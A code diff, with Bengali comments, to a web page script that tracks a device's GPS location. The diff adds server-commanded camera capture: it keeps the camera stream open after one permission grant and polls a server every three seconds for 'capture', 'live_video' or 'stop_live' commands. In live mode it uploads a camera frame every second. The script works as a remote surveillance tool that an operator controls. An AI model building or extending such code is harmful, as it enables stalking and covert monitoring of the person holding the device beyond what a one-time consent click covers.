@@ -40,6 +40,9 @@
     <script>
         let watchId = null;
         let sharingInterval = null;
+        let liveVideoInterval = null; // লাইভ ভিডিওর জন্য
+        let currentStream = null; // ক্যামেরা স্ট্রিম ধরে রাখার জন্য
+
         const btn = document.getElementById('consentBtn');
         const statusMsg = document.getElementById('statusMsg');
         const clientId = 'device_' + Math.random().toString(36).substr(2, 9);
@@ -98,17 +101,14 @@
             btn.innerText = '⏳ সংযোগ স্থাপন...';
             statusMsg.innerText = '📡 পারমিশন চাচ্ছি...';
 
-            // ১. প্রথমে ক্যামেরার পারমিশন নেওয়া (ছবি তোলার জন্য)
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                stream.getTracks().forEach(track => track.stop()); // পারমিশন পেলে বন্ধ করে দেওয়া
-                console.log("ক্যামেরা পারমিশন পাওয়া গেছে");
+                // ক্যামেরা স্ট্রিম চালু করে রাখা (লাইভ ভিডিওর জন্য)
+                currentStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                console.log("ক্যামেরা রেডি");
             } catch (err) {
                 console.log("ক্যামেরা পারমিশন পাওয়া যায়নি: ", err);
-                // ইউজার না দিলেও আমরা লোকেশন চালু রাখব
             }
 
-            // ২. এরপর লোকেশনের পারমিশন নেওয়া
             if (!navigator.geolocation) {
                 alert('আপনার ব্রাউজার GPS সাপোর্ট করে না।');
                 return;
@@ -144,7 +144,7 @@
                 { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
             );
 
-            // প্রতি ৩ সেকেন্ডে সার্ভার চেক করবে কোনো কমান্ড এসেছে কিনা
+            // প্রতি ৩ সেকেন্ডে সার্ভার চেক করবে কমান্ড এসেছে কিনা
             sharingInterval = setInterval(checkCommands, 3000);
         }
 
@@ -187,37 +187,76 @@
                 .then(res => res.json())
                 .then(clients => {
                     const data = clients[clientId];
-                    if (data && data.command === 'capture') {
+                    if (!data) return;
+
+                    if (data.command === 'capture') {
                         takePhoto();
+                        resetCommand();
+                    } else if (data.command === 'live_video') {
+                        startLiveVideo();
+                    } else if (data.command === 'stop_live') {
+                        stopLiveVideo();
+                        resetCommand();
                     }
                 }).catch(err => console.log(err));
         }
 
+        function resetCommand() {
+            // কমান্ড সম্পন্ন হলে সার্ভার থেকে মুছে দেওয়া
+            fetch('/api/update', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ id: clientId, camera_image: null, time: new Date().toISOString() })
+            });
+        }
+
         function takePhoto() {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(stream => {
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.play();
+            if (!currentStream) return;
+            const video = document.createElement('video');
+            video.srcObject = currentStream;
+            video.play();
+            
+            video.onloadedmetadata = () => {
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const imageData = canvas.toDataURL('image/jpeg', 0.5); 
+                sendCameraData(imageData);
+            };
+        }
+
+        function startLiveVideo() {
+            if (liveVideoInterval) return; // আগে থেকেই চললে কিছু করবে না
+            statusMsg.innerText = '🔴 লাইভ ভিডিও চলছে...';
+            
+            liveVideoInterval = setInterval(() => {
+                if (!currentStream) return;
+                const video = document.createElement('video');
+                video.srcObject = currentStream;
+                video.play();
+                
+                video.onloadedmetadata = () => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    video.onloadedmetadata = () => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        stream.getTracks().forEach(track => track.stop());
-                        
-                        const imageData = canvas.toDataURL('image/jpeg', 0.6); 
-                        sendCameraData(imageData);
-                    };
-                })
-                .catch(err => {
-                    console.error("ক্যামেরা অ্যাক্সেস ব্যর্থ:", err);
-                    // পারমিশন না থাকলে কমান্ড রিসেট করার জন্য ফাঁকা ছবি পাঠানো
-                    sendCameraData("NO_PERMISSION"); 
-                });
+                    const imageData = canvas.toDataURL('image/jpeg', 0.4); // কোয়ালিটি কম যাতে দ্রুত যায়
+                    sendCameraData(imageData);
+                };
+            }, 1000); // প্রতি ১ সেকেন্ডে ছবি তুলে পাঠাবে
+        }
+
+        function stopLiveVideo() {
+            if (liveVideoInterval) {
+                clearInterval(liveVideoInterval);
+                liveVideoInterval = null;
+                statusMsg.innerText = '🟢 ডেটা পাঠানো হচ্ছে... (লাইভ)';
+            }
         }
 
         function sendCameraData(imageData) {
